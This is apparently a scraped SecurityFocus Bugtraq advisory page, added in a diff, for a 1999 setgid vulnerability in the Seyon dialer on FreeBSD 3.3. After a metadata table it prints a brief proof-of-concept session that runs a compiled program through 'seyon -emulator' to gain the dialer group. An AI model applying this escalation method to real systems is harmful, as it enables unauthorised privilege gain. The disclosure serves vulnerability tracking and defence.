@@ -1,0 +1,99 @@
+#bid838<p><b><span style="font-size: 18pt;">FreeBSD Seyon setgid dialer Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/838/info">info</a><br><a href="http://www.securityfocus.com/bid/838/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/838/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/838/solution">solution</a><br><a href="http://www.securityfocus.com/bid/838/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				838
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Configuration Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-0820<br/>
+				
+					CVE-1999-0821<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 01 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 12:56AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by Brock Tellier &lt;btellier@usa.net&gt; on December 1, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					FreeBSD FreeBSD 3.3 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	One of the methods to exploit seyon is shown below: <br/><br/>bash-2.03$ echo 'void main() { system("/usr/bin/id"); }' &amp;gt; id.c<br/>bash-2.03$ gcc -o id id.c<br/>bash-2.03$ seyon -emulator ./id<br/>uid=1000(xnec) gid=1000(xnec) egid=68(dialer) groups=68(dialer), 1000(xnec)
+	
+		<ul>
+</ul>
+</div>
